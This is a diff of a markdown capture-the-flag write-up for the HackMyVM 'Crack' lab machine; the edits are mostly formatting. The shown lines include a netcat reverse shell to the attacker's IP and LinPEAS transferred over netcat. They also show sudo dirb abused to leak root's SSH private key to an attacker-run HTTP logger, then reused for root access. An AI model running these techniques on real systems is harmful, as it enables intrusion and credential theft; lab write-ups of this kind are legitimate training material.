@@ -12,9 +12,15 @@
 
 <img src="https://hackmyvm.eu/img/vm/ez.png" alt="Crack Machine Logo" width="150"/>
 
+#### Tools Used
+
+- LinPEAS
+- Netcat
+- Nmap
+
 #### Machine Writeup
 
-<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>
+![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
 `ifconfig`:
 ```
@@ -99,7 +105,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.61 seconds
 ```
 
 <div>
-	<img src="assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
+	<img src="./assets/logo_hacktricks.png" alt="HackTricks Logo" width="16" height="auto">
 	<span style="color: red; font-size: 110%;"><strong>HackTricks</strong></span>
 </div>
 
@@ -187,6 +193,7 @@ File to read:crack.py ←
 ```
 
 `touch ./passwd`
+
 `ftp 192.168.56.124`:
 ```
 Connected to 192.168.56.124.
@@ -253,6 +260,7 @@ Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
 Last login: Wed Sep 25 11:42:33 CEST 2024 from 192.168.56.118 on pts/0
 ```
+
 `<right-click>` > `About...`:
 ```
 Shell In A Box 2.20 
@@ -267,35 +275,36 @@ This product includes cryptographic software written by Eric Young
 (eay@cryptsoft.com)
 ```
 
-<span style="color: #64b5f6;"><b>Victim { os: debian linux, user: <code>cris</code> }</b></span>
+![Victim: cris](https://img.shields.io/badge/Victim-cris-64b5f6?logo=linux&logoColor=white)
 
 `whoami`:
 ```
 cris ←
 ```
 
-<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>
+![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
 `nc -lvnp 4444`:
 ```
 listening on [any] 4444 ... ←
 ```
 
-<span style="color: #64b5f6;"><b>Victim { os: debian linux, user: <code>cris</code> }</b></span>
+![Victim: cris](https://img.shields.io/badge/Victim-cris-64b5f6?logo=linux&logoColor=white)
 
 `which bash`:
 ```
 /usr/bin/bash ←
 ```
+
 `nc -c '/usr/bin/bash' 192.168.56.118 4444`
 
-<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>
+![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
 ```
 connect to [192.168.56.118] from (UNKNOWN) [192.168.56.124] 44018 ←
 ```
 
-<span style="color: #64b5f6;"><b>Victim { os: debian linux, user: <code>cris</code> }</b></span>
+![Victim: cris](https://img.shields.io/badge/Victim-cris-64b5f6?logo=linux&logoColor=white)
 
 `python3 -c 'import pty; pty.spawn("/bin/bash")' && stty raw -echo && fg; export TERM=xterm; stty rows $(tput lines) cols $(tput cols)`
 
@@ -318,6 +327,7 @@ Codename:       bullseye
 ```
 
 `cd /home/cris`
+
 `ls -alps`:
 ```
 total 44
@@ -341,11 +351,13 @@ eG4TUsTBxSFjTOPHMV ←
 ```
 
 `cd /tmp`
+
 `nc -lvnp 5555 > ./linpeas.sh`
 
-<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>
+![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
 `cd /home/kali/Desktop/tools`
+
 `ls -alps`:
 ```
 total 10060
@@ -367,9 +379,10 @@ total 10060
   60 -rw-r--r-- 1 root root   61440 May 17  2023 RunasCs_net2.exe
  368 -rw-rw-r-- 1 kali kali  375176 Sep 23 09:43 socat
 ```
+
 `cat linpeas.sh | nc 192.168.56.124 5555`
 
-<span style="color: #64b5f6;"><b>Victim { os: debian linux, user: <code>cris</code> }</b></span>
+![Victim: cris](https://img.shields.io/badge/Victim-cris-64b5f6?logo=linux&logoColor=white)
 
 `ls -alps`:
 ```
@@ -387,7 +400,9 @@ total 880
 ```
 
 `chmod +x ./linpeas.sh`
+
 `./linpeas.sh > ./linpeas_output.txt`
+
 `cat ./linpeas_output.txt`:
 ```
 [...]
@@ -420,10 +435,10 @@ User cris may run the following commands on crack:
 [...]
 ```
 
-<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>
+![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
-`mkdir http_server_logger`
-`cd ./http_server_logger`
+`mkdir http_server_logger && cd ./http_server_logger`
+
 `vim ./http_server_logger.py`:
 ```python
 #!/usr/bin/python3
@@ -463,13 +478,15 @@ with socketserver.TCPServer(("", PORT), CustomHandler) as httpd:
         print('Stopping server...')  
         httpd.server_close()
 ```
+
 `chmod +x ./http_server_logger.py`
+
 `./http_server_logger.py`:
 ```
 Serving on port 8888... ←
 ```
 
-<span style="color: #64b5f6;"><b>Victim { os: debian linux, user: <code>cris</code> }</b></span>
+![Victim: cris](https://img.shields.io/badge/Victim-cris-64b5f6?logo=linux&logoColor=white)
 
 `sudo /usr/bin/dirb http://192.168.56.118:8888 /root/.ssh/id_rsa`:
 ```
@@ -493,7 +510,7 @@ END_TIME: Wed Sep 25 13:42:36 2024
 DOWNLOADED: 38 - FOUND: 0
 ```
 
-<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>
+![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
 ```
 192.168.56.124 - - [25/Sep/2024 07:49:23] "GET /randomfile1 HTTP/1.1" 200 -
@@ -511,6 +528,7 @@ DOWNLOADED: 38 - FOUND: 0
 192.168.56.124 - - [25/Sep/2024 07:49:23] "GET /s8IoeeQHSidUKBAAAACnJvb3RAY3JhY2s= HTTP/1.1" 200 -
 192.168.56.124 - - [25/Sep/2024 07:49:23] "GET /-----END HTTP/1.1" 200 -
 ```
+
 `echo 'b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn' | wc -m`:
 ```
 71
@@ -525,7 +543,7 @@ total 20
 4 -rwxrwxr-x 1 kali kali  995 Sep 25 07:48 http_server_logger.py
 ```
 
-`cat get_requests.log`:
+`cat ./get_requests.log`:
 ```
 2024-09-25 08:48:48,166 - Received GET request: Path=randomfile1, Client=127.0.0.1
 2024-09-25 08:48:48,168 - Received GET request: Path=frand2, Client=127.0.0.1
@@ -542,7 +560,7 @@ total 20
 2024-09-25 08:48:48,199 - Received GET request: Path=/-----END, Client=127.0.0.1
 ```
 
-`cat get_requests.log | cut -d'=' -f2 | cut -d',' -f1`:
+`cat ./get_requests.log | cut -d'=' -f2 | cut -d',' -f1`:
 ```
 randomfile1
 frand2
@@ -633,7 +651,7 @@ s8IoeeQHSidUKBAAAACnJvb3RAY3JhY2s=
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... ←
 ```
 
-<span style="color: #64b5f6;"><b>Victim { os: debian linux, user: <code>cris</code> }</b></span>
+![Victim: cris](https://img.shields.io/badge/Victim-cris-64b5f6?logo=linux&logoColor=white)
 
 `wget http://192.168.56.118/id_rsa -P /tmp`:
 ```
@@ -647,7 +665,9 @@ id_rsa              100%[===================>]   2,53K  --.-KB/s    en 0s
 
 2024-09-25 14:06:16 (168 MB/s) - «/tmp/id_rsa» guardado [2588/2588] ←
 ```
+
 `chmod 600 /tmp/id_rsa`
+
 `ls -alps ./`:
 ```
 total 996
@@ -678,7 +698,7 @@ permitted by applicable law.
 Last login: Wed Sep 25 14:16:44 2024 from 127.0.0.1
 ```
 
-<span style="color: #64b5f6;"><b>Victim { os: debian linux, user: <code>root</code> }</b></span>
+![Victim: root](https://img.shields.io/badge/Victim-root-64b5f6?logo=linux&logoColor=white)
 
 `whoami`:
 ```
@@ -691,6 +711,7 @@ uid=0(root) gid=0(root) grupos=0(root) ←
 ```
 
 `cd /root`
+
 `ls -alps`:
 ```
 total 32
